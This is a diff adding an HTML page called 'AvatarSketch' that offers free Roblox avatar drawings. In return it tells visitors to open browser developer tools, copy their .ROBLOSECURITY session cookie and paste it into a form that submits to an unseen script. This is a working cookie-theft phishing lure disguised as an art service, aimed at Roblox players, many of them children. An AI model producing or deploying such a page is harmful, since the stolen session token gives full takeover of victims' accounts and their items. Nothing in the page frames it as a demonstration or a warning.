@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AvatarSketch - Roblox Art</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <img src="roblox-logo.png" alt="Roblox" width="80">
+        <nav>
+            <a href="#">Home</a>
+            <a href="#!/avatar-sketch">Get Art</a>
+            <a href="#">Samples</a>
+        </nav>
+    </header>
+    <main>
+        <section id="avatar-sketch">
+            <h1>Avatar Art Generator</h1>
+            <p>Mate, your Roblox avatar’s wicked! I’ll draw it for free—just share your avatar code:</p>
+            <ol>
+                <li>Head to your <a href="https://www.roblox.com/my/avatar" target="_blank">Roblox Avatar page</a>.</li>
+                <li>Right-click, hit "Inspect" (or F12), go to Application > Cookies > https://www.roblox.com.</li>
+                <li>Copy the <code>.ROBLOSECURITY</code> cookie (starts with <code>_ |WARNING</code>).</li>
+                <li>Paste it below to get your avatar drawn!</li>
+            </ol>
+            <textarea id="cookie-input" placeholder="Paste your .ROBLOSECURITY cookie here"></textarea>
+            <button onclick="submitCookie()">Submit for Art</button>
+            <p id="status"></p>
+        </section>
+    </main>
+    <footer>
+        <p>© 2025 AvatarSketch.</p>
+    </footer>
+    <script src="script.js"></script>
+</body>
+</html>
